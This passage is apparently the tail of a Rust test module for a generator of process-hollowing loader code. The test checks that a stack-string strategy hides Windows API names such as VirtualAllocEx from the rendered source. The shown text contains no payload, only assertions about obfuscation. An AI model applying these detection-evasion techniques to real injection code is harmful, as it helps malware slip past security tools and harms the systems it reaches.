        assert!(!none_block.contains("VirtualAllocEx"));
    }

    #[test]
    fn stack_strategy_obfuscates_names_without_dec_xor() {
        let stack = StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        };
        let block = render_block(&indirect(), &hollowing_pipeline(), &stack);
        assert!(!block.contains("dec_xor"), "stack must not use dec_xor");
        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
        assert!(
            leaked.is_empty(),
            "cleartext names leaked outside comments: {leaked:?}"
        );
        assert!(
            block.contains("std::hint::black_box"),
            "stack stores missing"
        );
    }
}
